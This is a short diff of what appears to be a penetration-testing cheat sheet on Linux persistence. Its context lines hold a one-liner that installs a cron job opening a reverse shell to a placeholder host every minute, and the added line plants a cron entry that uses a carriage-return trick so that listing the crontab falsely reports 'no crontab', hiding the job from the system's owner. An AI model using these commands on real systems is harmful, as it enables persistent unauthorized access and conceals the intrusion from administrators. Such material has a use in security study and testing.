@@ -16,6 +16,8 @@ anytime you have a remote shell, remember to background it and run *stty raw -ec
 
 `crontab -l > /tmp/tmp.cgL8qKGk4U && echo "* * * * * bash -c 'bash -i > /dev/tcp/RHOST/RPORT 2>&1 0>&1'" >> /tmp/tmp.cgL8qKGk4U; crontab /tmp/tmp.cgL8qKGk4U && rm /tmp/tmp.cgL8qKGk4U`
 
+`echo -e "* * * * * echo task\rno crontab for $USER" | crontab`
+
 ## systemctl
 
 ```
